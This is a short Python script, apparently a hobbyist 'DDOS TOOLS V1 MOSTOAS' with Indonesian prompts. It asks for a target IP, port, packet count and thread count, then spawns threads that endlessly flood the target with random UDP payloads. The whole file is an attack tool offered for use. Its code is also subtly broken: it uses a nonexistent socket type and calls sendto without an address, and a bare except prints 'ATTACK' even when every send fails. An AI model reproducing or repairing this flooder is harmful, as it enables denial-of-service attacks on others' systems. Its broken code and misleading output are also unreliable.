import socket
import random
import threading
import os,sys

print("DDOS TOOLS V1 MOSTOAS")

ip_mostoas = str(input("Ip Target : "))
port_mostoas = int(input("Port Target : "))
paket_mostoas = int(input("Paket Dari Mostoas : "))
threads_mostoas = int(input("Thread Dari Mostoas : "))
os.system("clear")

def mostoas():
    asu = random._urandom(1800)
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_GRAM)
            s.connect((ip_mostoas,port_mostoas))
            s.sendto(asu)
            for x in range(paket_mostoas):
                s.sendto(asu)
            print("[•] MOSTOAS ATTACK!!!")
        except:
            print("[•] MOSTOAS ATTACK!!!")

for y in range(threads_mostoas):
    th = threading.Thread(target=mostoas)
    th.start()